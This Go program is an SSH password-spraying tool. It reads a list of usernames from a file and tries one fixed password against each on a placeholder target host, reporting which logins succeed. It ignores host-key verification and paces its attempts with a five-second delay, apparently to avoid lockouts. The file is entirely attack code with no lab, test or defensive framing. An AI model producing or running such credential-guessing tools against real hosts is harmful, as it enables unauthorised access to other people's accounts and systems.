package main
import(
	"fmt"
	"os"
	"bufio"
	"log"
	"strings"
	"time"
	"golang.org/x/crypto/ssh"
)

const(
	targetHost = "<ip>"
	password = "<pass>"
	timeout = 10*time.Second
)

func main(){
	file,err := os.Open("usernames.txt")
	if(err!=nil){
		log.Fatal(err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan(){
		username := strings.TrimSpace(scanner.Text())
		if username == "" {
			continue
		}
		fmt.Println("Processing:", username)
		err := trySSH(username,password)
		if err != nil {
			fmt.Printf("Failed for %s: %v\n", username, err)
		} else {
			fmt.Printf("SUCCESS for %s!\n", username)
		}
		time.Sleep(5 * time.Second)
	}
	if err:=scanner.Err(); err!=nil{
		log.Fatal(err)
	}
}

func trySSH(username,password string) error{
	config := &ssh.ClientConfig{
		User:username,
		Auth:[]ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: timeout,
	}
	conn,err := ssh.Dial("tcp",targetHost,config)
	if err!=nil{
		return err
	}
	defer conn.Close()
	return nil
}